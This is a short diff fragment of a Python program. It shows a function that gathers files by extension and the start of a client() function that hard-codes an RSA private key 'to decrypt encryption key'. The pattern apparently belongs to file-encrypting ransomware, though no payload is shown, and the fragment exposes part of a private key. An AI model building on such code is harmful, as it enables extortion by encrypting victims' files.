@@ -71,11 +71,11 @@ def dir_f_list(d):
 			ex = full_path.split(".")[-1]
 			if ex in extensions:
 				fd.append(full_path)
-				#print(full_path)
+				
 	return fd
 #client to connection
 def client():
-
+# to decrypt encryption key  
     privkey ="""-----BEGIN RSA PRIVATE KEY-----
     MIIEpAIBAAKCAQEAuDXmLnn23eM+AESxPu+bFc9mNhn1j7H+sU5M6Fl0izFJv7Ds
     uhrEbP7pGFAyIEw3ZDmDxK1N1SVX6STSTT16K93LjmbxajxU7FYBrZHGkCxNJdIN
